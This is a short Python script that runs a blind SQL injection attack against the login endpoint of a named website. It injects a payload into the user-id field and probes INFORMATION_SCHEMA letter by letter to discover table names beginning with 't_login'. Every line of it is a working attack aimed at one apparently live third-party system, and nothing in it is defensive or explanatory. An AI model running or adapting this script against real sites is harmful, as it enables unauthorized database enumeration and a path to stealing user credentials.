import requests
import json
import time

url = "http://www.melinked.com/webh5/user/login"
data = {"uc_id": "ss", "provider_pass": "root"}
sqlPattern = "') OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='melinked' AND TABLE_NAME like 't_login%s%%') limit 1#"
lowerLetters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '_']
capitalLetters = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_']

for char in lowerLetters:
    data["uc_id"] = sqlPattern % char
    response = requests.post(url, data=data)
    text = response.text
    if text.__contains__('mother_language'):
        print("----------------------------found one " + char)
    print(char)


